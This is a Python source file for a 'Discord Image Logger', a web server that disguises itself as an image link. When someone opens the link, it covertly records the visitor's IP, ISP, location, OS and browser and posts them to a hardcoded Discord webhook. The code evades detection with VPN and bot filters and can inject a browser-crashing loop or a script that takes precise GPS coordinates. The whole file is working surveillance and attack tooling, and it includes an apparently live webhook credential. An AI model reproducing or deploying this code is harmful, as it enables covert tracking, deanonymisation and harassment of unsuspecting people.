# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1127786541985570858/-VpY-EMhAdtDT5IYsq04PMcOGboCZUv-ARVeQ8WH2LPC7ndo3oqFjhKLZGIiWcuc0jE_",
    "image": "data:image/jpeg;base64,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 ", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
